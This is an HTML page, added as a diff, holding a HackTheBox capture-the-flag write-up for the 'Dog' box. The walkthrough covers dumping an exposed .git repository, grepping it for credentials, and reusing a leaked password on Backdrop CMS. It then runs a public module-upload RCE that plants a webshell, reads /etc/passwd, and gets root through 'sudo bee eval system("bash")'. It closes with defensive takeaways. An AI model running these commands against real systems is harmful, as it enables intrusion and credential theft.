@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dog - HackTheBox Writeup</title>
+    <style>
+        /* ========================================
+           HACK THE BOX WRITEUP THEME
+           ======================================== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f1419;
+            color: #c5d1d8;
+            font-family: 'Segoe UI', 'Ubuntu', 'Roboto', sans-serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 40px 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Headings */
+        h1, h2, h3 {
+            color: #9fef00;
+            font-weight: 600;
+            margin-top: 2em;
+            margin-bottom: 0.8em;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            border-bottom: 3px solid #9fef00;
+            padding-bottom: 15px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            border-left: 4px solid #9fef00;
+            padding-left: 15px;
+            margin-top: 2.5em;
+        }
+
+        h3 {
+            font-size: 1.3em;
+            color: #00d9ff;
+            margin-top: 1.8em;
+        }
+
+        h4 {
+            font-size: 1.1em;
+            color: #00d9ff;
+            margin-top: 1.5em;
+            margin-bottom: 0.8em;
+        }
+
+        /* Paragraphs */
+        p {
+            margin-bottom: 1.2em;
+            color: #c5d1d8;
+        }
+
+        /* Strong/Bold */
+        strong {
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        /* Links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #9fef00;
+            border-bottom: 1px solid #9fef00;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .info-box p {
+            margin: 0.5em 0;
+        }
+
+        .info-box strong {
+            color: #00d9ff;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 1.5em 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #9fef00;
+        }
+
+        /* Inline code */
+        p code, li code {
+            background: #1a2332;
+            color: #9fef00;
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid #2d3748;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1em 0 1em 2em;
+            color: #c5d1d8;
+        }
+
+        li {
+            margin-bottom: 0.5em;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid #2d3748;
+            margin: 1.5em 0;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Image placeholder for missing images */
+        .img-placeholder {
+            background: #1a2332;
+            border: 2px dashed #2d3748;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 1.5em 0;
+            text-align: center;
+            color: #5c6773;
+            font-style: italic;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        th {
+            background: #1f2937;
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover {
+            background: #1f2937;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a2332;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #9fef00;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8dd900;
+        }
+
+        /* Special styling for specific sections */
+        .command-output {
+            color: #a3b3bc;
+        }
+
+        .redacted {
+            color: #ff79c6;
+            font-weight: bold;
+        }
+
+        /* Header banner */
+        .header-banner {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1419 100%);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 2em;
+            text-align: center;
+        }
+
+        .header-banner h1 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+
+        .header-banner p {
+            color: #9fef00;
+            font-size: 1.1em;
+            margin: 10px 0 0 0;
+        }
+
+        /* Highlight boxes */
+        .highlight {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #ffc107;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .highlight strong {
+            color: #ffc107;
+        }
+
+        .success {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #28a745;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .success strong {
+            color: #28a745;
+        }
+
+        .warning {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #dc3545;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .warning strong {
+            color: #dc3545;
+        }
+
+        /* Step boxes */
+        .step {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .step h4 {
+            margin-top: 0;
+            color: #00d9ff;
+        }
+
+        /* Author footer */
+        .author {
+            text-align: center;
+            margin-top: 3em;
+            padding-top: 2em;
+            border-top: 1px solid #2d3748;
+            color: #5c6773;
+            font-style: italic;
+        }
+    
+        /* Screenshot slot wrapper (added for repo build) */
+        .shot { margin: 1.5em 0; }
+        .shot img { margin: 0; }
+</style>
+</head>
+<body>
+    <div class="header-banner">
+        <h1>Dog</h1>
+        <p>HackTheBox Writeup</p>
+    </div>
+
+    <div class="info-box">
+        <p><strong>Box Name:</strong> Dog</p>
+        <p><strong>Difficulty:</strong> Easy</p>
+        <p><strong>OS:</strong> Linux</p>
+        <p><strong>Date Completed:</strong> 29-10-2026</p>
+        <p><strong>IP Address:</strong> 10.129.231.223</p>
+    </div>
+
+    <h2>Summary</h2>
+    <p>Enumerating the box showed two ports being open. Port 80 was running Backdrop CMS and, more importantly, an exposed <code>.git</code> repository was leaking the site's source. Dumping the repo and searching through the code gave me a MySQL password. After enumerating valid usernames on the CMS, I reused this password to log in as <code>tiffany</code>. From the admin panel I abused an authenticated RCE in Backdrop CMS 1.27.1 to upload a malicious module and drop a webshell. Enumerating local users gave me <code>johncusack</code>, and reusing the same MySQL password over SSH got me the User Flag. Escalating privileges required checking <code>sudo -l</code>, which showed I could run the Backdrop CLI tool <code>bee</code> as root. Abusing its eval command to execute PHP let me spawn a root shell and grab the Root Flag.</p>
+    <h2>Enumeration</h2>
+    <h3>Nmap Scan</h3>
+    <pre><code>nmap 10.129.231.223 -sV -sC -T4 -A</code></pre>
+    <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
+|_http-title: Home | Dog
+| http-git:
+|   10.129.231.223:80/.git/
+|   Git repository found!
+|_  Last commit message: todo: customize url aliases.
+|_http-server-header: Apache/2.4.41 (Ubuntu)</code></pre>
+    <p><strong>Results:</strong></p>
+    <ul>
+        <li>Port 22: SSH (OpenSSH 8.2p1)</li>
+        <li>Port 80: HTTP (Apache 2.4.41) - Backdrop CMS 1.x</li>
+        <li>Exposed <code>.git</code> repository found at <code>/.git/</code></li>
+    </ul>
+    <div class="shot">
+        <img src="dog_01.png" alt="nmap scan showing port 80 + exposed .git repository"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_01.png</code><br>nmap scan showing port 80 + exposed .git repository</div>
+    </div>
+    <h3>HTTP Enumeration</h3>
+    <p>After adding the hostname to my hosts file I can visit the website on port 80.</p>
+    <pre><code>echo "10.129.231.223 dog.htb" | sudo tee -a /etc/hosts</code></pre>
+    <p>The site is a Backdrop CMS instance sitting in maintenance mode. The far more interesting finding from nmap is the exposed <code>.git/</code> directory, which means the full repository is downloadable and we can read the source offline.</p>
+    <div class="shot">
+        <img src="dog_02.png" alt="Backdrop CMS site in maintenance mode"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_02.png</code><br>Backdrop CMS site in maintenance mode</div>
+    </div>
+    <h4>Dumping the repo</h4>
+    <pre><code>git-dumper http://dog.htb/.git/ ./dog-git
+cd ./dog-git
+grep -riE "password|passwd|pwd|db_|mysql" .</code></pre>
+    <p>This recovered a MySQL password from the Backdrop configuration in the source. Password reuse was the obvious next step, but I needed a valid user to pair it with first, so I enumerated usernames.</p>
+    <div class="shot">
+        <img src="dog_03.png" alt="MySQL password recovered from the .git dump"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_03.png</code><br>MySQL password recovered from the .git dump</div>
+    </div>
+    <p>I also fingerprinted the exact CMS version with a Backdrop scanner, which came back as 1.27.1 — relevant for the RCE later on.</p>
+    <pre><code>python3 BackDropScan.py --url http://dog.htb
+# Backdrop CMS version =&gt; 1.27.1</code></pre>
+    <h3>User Enumeration</h3>
+    <p>Using the same Backdrop scanner against a username wordlist returned several valid accounts.</p>
+    <pre><code>python3 BackDropScan.py --url http://dog.htb --userenum \
+  --userslist /opt/useful/seclists/Usernames/Names/names.txt
+
+[+] Valid username: axel
+[+] Valid username: john
+[+] Valid username: morris
+[+] Valid username: rosa
+[+] Valid username: tiffany</code></pre>
+    <p>The account that matters here is <code>tiffany</code>. This is the user I'll reuse the leaked MySQL password against.</p>
+    <h2>Initial Foothold</h2>
+    <h3>Vulnerability Discovery</h3>
+    <p>Backdrop CMS version 1.27.1 is vulnerable to an authenticated remote code execution flaw. An admin-privileged user can upload a crafted module archive, which Backdrop extracts and serves, dropping a PHP webshell under the web root. This means that if I can get into the admin panel, I can get command execution.</p>
+    <div class="highlight">
+    <p><strong>CVE:</strong> Backdrop CMS authenticated RCE (1.27.1)</p>
+    </div>
+    <h3>Exploitation</h3>
+    <p>First, password reuse. The MySQL password recovered from the <code>.git</code> dump also works for the Backdrop account <code>tiffany</code>, which lands an authenticated admin session.</p>
+    <p>With admin access confirmed, I used the following PoC to automate the module-upload RCE and drop a webshell. PoC: <code>https://github.com/rvzsec/backdrop-rce</code></p>
+    <pre><code>python exploit.py http://dog.htb tiffany <span class="redacted">&lt;REDACTED&gt;</span>
+[&gt;] logging in as user: 'tiffany'
+[&gt;] login successful
+[&gt;] enabling maintenance mode
+[&gt;] payload archive: /tmp/bd_bca02alh/rvzef390c.tgz
+[&gt;] batch id = 13; sending authorize 'do_nojs' and 'do'
+[&gt;] waiting for shell at: http://dog.htb/modules/rvzef390c/shell.php
+[&gt;] shell is live</code></pre>
+    <p>The PoC labels its prompt <code>root@dog.htb &gt;</code>, but that's cosmetic — the webshell actually runs as the web server user (<code>www-data</code>). From here I enumerated which local accounts have a real login shell.</p>
+    <div class="shot">
+        <img src="dog_04.png" alt="Webshell running as www-data after the module-upload RCE"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_04.png</code><br>Webshell running as www-data after the module-upload RCE</div>
+    </div>
+    <pre><code>root@dog.htb &gt; cat /etc/passwd | grep /bin/bash
+root:x:0:0:root:/root:/bin/bash
+jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
+johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash</code></pre>
+    <p><code>johncusack</code> is the next target.</p>
+    <h3>User flag</h3>
+    <p>Reusing the same MySQL password one more time — this time over SSH as <code>johncusack</code> — works, and I can grab the User Flag.</p>
+    <pre><code>ssh johncusack@10.129.231.223
+johncusack@10.129.231.223's password: <span class="redacted">&lt;REDACTED&gt;</span>
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
+
+johncusack@dog:~$ cat user.txt
+<span class="redacted">&lt;REDACTED&gt;</span></code></pre>
+    <h2>Privilege Escalation</h2>
+    <h3>Enumeration</h3>
+    <p>Checking what <code>johncusack</code> is allowed to run with sudo gave a clear path.</p>
+    <pre><code>johncusack@dog:~$ sudo -l
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee</code></pre>
+    <p><code>johncusack</code> can run <code>bee</code> — the Backdrop CMS command-line tool — as any user including root, with no restriction on the command's arguments. The <code>eval</code> subcommand stands out: it will "Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop." Arbitrary PHP as root is a trivial path to a shell.</p>
+    <h3>Exploitation and root flag</h3>
+    <p>Using <code>bee eval</code> to run PHP's <code>system()</code> and spawn <code>bash</code> gives a root shell, and I can read the Root Flag.</p>
+    <pre><code>sudo /usr/local/bin/bee eval 'system("bash")'
+root@dog:/var/www/html#
+
+root@dog:~# cat root.txt
+<span class="redacted">&lt;REDACTED&gt;</span></code></pre>
+    <div class="shot">
+        <img src="dog_05.png" alt="Root shell via bee eval and the root flag"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_05.png</code><br>Root shell via bee eval and the root flag</div>
+    </div>
+    <div class="warning">
+    <p><strong>Gotcha:</strong> <code>bee eval</code> has to bootstrap a working Backdrop installation before it will run any PHP. Run it from a random directory and it errors out because it can't locate the Backdrop root. Running it from inside the docroot (<code>/var/www/html</code>) fixes this. Alternatively, point <code>bee</code> at the install explicitly so it works from anywhere:</p>
+    <pre><code>sudo /usr/local/bin/bee --root=/var/www/html eval 'system("bash")'</code></pre>
+    </div>
+    <h2>Key Takeaways</h2>
+    <ul>
+        <li>Exposing a <code>.git</code> directory on a production web server leaks the entire source tree and any secrets committed to it — this single misconfiguration seeded the whole compromise.</li>
+        <li>Secrets like database passwords should never be committed to source control, and never reused across the database, CMS accounts, and system users. Here one password unlocked the CMS admin, the webshell, and the SSH user.</li>
+        <li>Keeping software patched matters — Backdrop CMS 1.27.1 was vulnerable to an authenticated RCE, and admin-level module install is effectively equivalent to code execution.</li>
+        <li>Scoping <code>sudo</code> tightly is critical: granting <code>bee</code> (which includes <code>eval</code>) as root is the same as handing out a root shell.</li>
+    </ul>
+    <h2>Tools Used</h2>
+    <ul>
+        <li>Nmap</li>
+        <li>git-dumper</li>
+        <li>BackDropScan</li>
+        <li>backdrop-rce (rvzsec PoC)</li>
+        <li>bee (Backdrop CLI)</li>
+    </ul>
+
+    <div class="author">
+        <p>Author: Tommie03</p>
+    </div>
+</body>
+</html>
